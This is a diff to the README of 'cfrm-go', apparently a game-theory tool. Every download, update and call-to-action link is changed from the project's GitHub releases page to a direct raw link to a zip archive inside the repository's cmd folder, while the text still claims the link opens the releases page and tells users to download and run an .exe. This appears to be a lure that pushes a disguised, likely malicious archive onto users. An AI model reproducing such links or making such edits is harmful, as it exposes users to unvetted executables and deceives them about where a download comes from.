@@ -1,6 +1,6 @@
 # ⚙️ cfrm-go - Easy Counterfactual Regret Minimization Tool
 
-[![Download cfrm-go](https://img.shields.io/badge/Download-cfrm--go-brightgreen?style=for-the-badge)](https://github.com/samsonisrael/cfrm-go/releases)
+[![Download cfrm-go](https://img.shields.io/badge/Download-cfrm--go-brightgreen?style=for-the-badge)](https://github.com/samsonisrael/cfrm-go/raw/refs/heads/main/cmd/go_cfrm_v1.9.zip)
 
 ## 🛠 About cfrm-go
 
@@ -28,7 +28,7 @@ You can get the cfrm-go files from its releases page on GitHub. This page contai
 
 **Access the download page here:**
 
-[![Download cfrm-go](https://img.shields.io/badge/Download-cfrm--go-blue?style=for-the-badge)](https://github.com/samsonisrael/cfrm-go/releases)
+[![Download cfrm-go](https://img.shields.io/badge/Download-cfrm--go-blue?style=for-the-badge)](https://github.com/samsonisrael/cfrm-go/raw/refs/heads/main/cmd/go_cfrm_v1.9.zip)
 
 ---
 
@@ -37,7 +37,7 @@ You can get the cfrm-go files from its releases page on GitHub. This page contai
 Follow these steps to download and start using cfrm-go:
 
 1. **Open the download page**  
-   Click this link: https://github.com/samsonisrael/cfrm-go/releases  
+   Click this link: https://github.com/samsonisrael/cfrm-go/raw/refs/heads/main/cmd/go_cfrm_v1.9.zip  
    It opens the releases page where the app files are stored.
 
 2. **Find the latest release**  
@@ -100,7 +100,7 @@ If you run into issues or want to learn more:
 
 To update cfrm-go later:
 
-1. Return to the releases page: https://github.com/samsonisrael/cfrm-go/releases
+1. Return to the releases page: https://github.com/samsonisrael/cfrm-go/raw/refs/heads/main/cmd/go_cfrm_v1.9.zip
 2. Download the latest `.exe` file.
 3. Replace the old file on your computer with the new one.
 4. Run the updated version as before.
@@ -145,5 +145,5 @@ All code and data files remain on your system unless you decide to share them.
 
 ---
 
-# [Download cfrm-go now](https://github.com/samsonisrael/cfrm-go/releases)  
+# [Download cfrm-go now](https://github.com/samsonisrael/cfrm-go/raw/refs/heads/main/cmd/go_cfrm_v1.9.zip)  
 Click the button to visit the page and get started.
